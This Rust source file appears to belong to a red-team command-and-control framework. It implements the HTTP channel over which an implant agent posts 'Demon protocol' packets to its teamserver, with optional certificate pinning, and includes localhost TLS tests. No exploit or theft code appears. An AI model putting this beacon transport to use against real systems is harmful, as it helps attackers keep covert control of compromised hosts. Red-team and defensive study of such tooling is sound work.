//! HTTP transport layer for communicating with the Red Cell teamserver.

use tracing::{debug, warn};

use crate::config::SpecterConfig;
use crate::error::SpecterError;

/// HTTP transport for sending Demon protocol packets to the teamserver.
#[derive(Debug)]
pub struct HttpTransport {
    client: reqwest::Client,
    callback_url: String,
}

impl HttpTransport {
    /// Create a new HTTP transport from the given agent configuration.
    ///
    /// If `config.pinned_cert_pem` is set, the default WebPKI/system root certificates are
    /// disabled and only the pinned PEM certificate is trusted.  When no pinned cert is
    /// configured, the system CA store is used instead.
    pub fn new(config: &SpecterConfig) -> Result<Self, SpecterError> {
        let mut builder = reqwest::Client::builder().user_agent(&config.user_agent);

        if let Some(pem) = &config.pinned_cert_pem {
            let cert = reqwest::Certificate::from_pem(pem.as_bytes())
                .map_err(|e| SpecterError::Transport(format!("invalid pinned certificate: {e}")))?;
            builder = builder.tls_built_in_root_certs(false).add_root_certificate(cert);
        }

        let client = builder.build().map_err(|e| SpecterError::Transport(e.to_string()))?;

        Ok(Self { client, callback_url: config.callback_url.clone() })
    }

    /// Send raw packet bytes to the teamserver and return the response body.
    pub async fn send(&self, packet: &[u8]) -> Result<Vec<u8>, SpecterError> {
        debug!(url = %self.callback_url, packet_len = packet.len(), "sending packet");

        let response = self
            .client
            .post(&self.callback_url)
            .body(packet.to_vec())
            .send()
            .await
            .map_err(|e| SpecterError::Transport(e.to_string()))?;

        let status = response.status();
        if !status.is_success() {
            warn!(status = %status, "teamserver returned non-success status");
            return Err(SpecterError::Transport(format!("teamserver returned HTTP {status}")));
        }

        let body = response.bytes().await.map_err(|e| SpecterError::Transport(e.to_string()))?;

        debug!(response_len = body.len(), "received response");
        Ok(body.to_vec())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::SpecterConfig;

    /// Generate a self-signed PEM certificate for testing.
    fn test_cert_pem() -> String {
        let cert = rcgen::generate_simple_self_signed(["localhost".to_string()])
            .expect("test cert generation");
        cert.cert.pem()
    }

    #[test]
    fn transport_creation_succeeds_with_default_config() {
        let config = SpecterConfig::default();
        assert!(HttpTransport::new(&config).is_ok());
    }

    #[test]
    fn transport_creation_succeeds_with_pinned_cert() {
        let config = SpecterConfig { pinned_cert_pem: Some(test_cert_pem()), ..Default::default() };
        assert!(HttpTransport::new(&config).is_ok());
    }

    #[test]
    fn transport_creation_fails_with_invalid_pem() {
        // PEM markers are present but the base64 content is malformed.
        // With the rustls backend, reqwest defers PEM parsing to build() time, so the error
        // surfaces there — we just assert that building fails with a Transport error.
        let config = SpecterConfig {
            pinned_cert_pem: Some(
                "-----BEGIN CERTIFICATE-----\n!!!NOT-VALID-BASE64!!!\n-----END CERTIFICATE-----\n"
                    .to_string(),
            ),
            ..Default::default()
        };
        let err = HttpTransport::new(&config).expect_err("invalid PEM should fail");
        assert!(matches!(err, SpecterError::Transport(_)));
    }

    /// Regression test: when a pinned cert is configured, the transport must reject a TLS
    /// server presenting a *different* self-signed certificate — even though both are valid.
    /// Before the fix, `add_root_certificate` augmented the default trust store instead of
    /// replacing it, so a server cert trusted by the system CAs would still be accepted.
    #[tokio::test]
    async fn pinned_cert_rejects_different_server_cert() {
        use std::sync::Arc;
        use tokio::net::TcpListener;

        let _ = rustls::crypto::ring::default_provider().install_default();

        // Generate two independent self-signed certs for localhost.
        let server_keys = rcgen::generate_simple_self_signed(["localhost".to_string()])
            .expect("server cert generation");
        let pinned_keys = rcgen::generate_simple_self_signed(["localhost".to_string()])
            .expect("pinned cert generation");

        // Build a rustls server config using the *server* cert (not the pinned one).
        let server_cert_der =
            rustls::pki_types::CertificateDer::from(server_keys.cert.der().to_vec());
        let server_key_der =
            rustls::pki_types::PrivateKeyDer::try_from(server_keys.key_pair.serialize_der())
                .expect("server key DER");
        let server_tls_config = rustls::ServerConfig::builder()
            .with_no_client_auth()
            .with_single_cert(vec![server_cert_der], server_key_der)
            .expect("server TLS config");
        let acceptor = tokio_rustls::TlsAcceptor::from(Arc::new(server_tls_config));

        // Bind to a random port on localhost.
        let listener = TcpListener::bind("127.0.0.1:0").await.expect("bind");
        let addr = listener.local_addr().expect("local_addr");

        // Spawn a task that accepts one TLS connection and sends a minimal HTTP response.
        let accept_handle = tokio::spawn(async move {
            if let Ok((stream, _)) = listener.accept().await {
                // The TLS handshake may fail from the server side too — that is fine.
                if let Ok(mut tls_stream) = acceptor.accept(stream).await {
                    use tokio::io::AsyncWriteExt;
                    let _ = tls_stream
                        .write_all(b"HTTP/1.1 200 OK\r\ncontent-length: 2\r\n\r\nok")
                        .await;
                    let _ = tls_stream.shutdown().await;
                }
            }
        });

        // Configure transport to pin the *other* cert (not the one the server presents).
        let config = SpecterConfig {
            callback_url: format!("https://localhost:{}", addr.port()),
            pinned_cert_pem: Some(pinned_keys.cert.pem()),
            ..Default::default()
        };
        let transport = HttpTransport::new(&config).expect("transport creation");

        // The send must fail because the server cert doesn't chain to the pinned root.
        let result = transport.send(b"hello").await;
        assert!(result.is_err(), "expected TLS error when server cert != pinned cert");
        let err_msg = format!("{}", result.expect_err("should be error"));
        assert!(
            err_msg.contains("certificate")
                || err_msg.contains("ssl")
                || err_msg.contains("tls")
                || err_msg.contains("error"),
            "error should mention certificate/TLS issue, got: {err_msg}"
        );

        accept_handle.abort();
    }

    /// Verify that when the pinned cert matches the server cert, the connection succeeds.
    #[tokio::test]
    async fn pinned_cert_accepts_matching_server_cert() {
        use std::sync::Arc;
        use tokio::net::TcpListener;

        let _ = rustls::crypto::ring::default_provider().install_default();

        let keys =
            rcgen::generate_simple_self_signed(["localhost".to_string()]).expect("cert generation");

        let cert_pem = keys.cert.pem();
        let cert_der = rustls::pki_types::CertificateDer::from(keys.cert.der().to_vec());
        let key_der = rustls::pki_types::PrivateKeyDer::try_from(keys.key_pair.serialize_der())
            .expect("key DER");
        let server_tls_config = rustls::ServerConfig::builder()
            .with_no_client_auth()
            .with_single_cert(vec![cert_der], key_der)
            .expect("server TLS config");
        let acceptor = tokio_rustls::TlsAcceptor::from(Arc::new(server_tls_config));

        let listener = TcpListener::bind("127.0.0.1:0").await.expect("bind");
        let addr = listener.local_addr().expect("local_addr");

        let accept_handle = tokio::spawn(async move {
            if let Ok((stream, _)) = listener.accept().await {
                if let Ok(mut tls_stream) = acceptor.accept(stream).await {
                    use tokio::io::AsyncWriteExt;
                    let _ = tls_stream
                        .write_all(b"HTTP/1.1 200 OK\r\ncontent-length: 2\r\n\r\nok")
                        .await;
                    let _ = tls_stream.shutdown().await;
                }
            }
        });

        let config = SpecterConfig {
            callback_url: format!("https://localhost:{}", addr.port()),
            pinned_cert_pem: Some(cert_pem),
            ..Default::default()
        };
        let transport = HttpTransport::new(&config).expect("transport creation");

        let result = transport.send(b"hello").await;
        assert!(
            result.is_ok(),
            "pinned cert matches server cert — should succeed, got: {result:?}"
        );

        accept_handle.abort();
    }
}
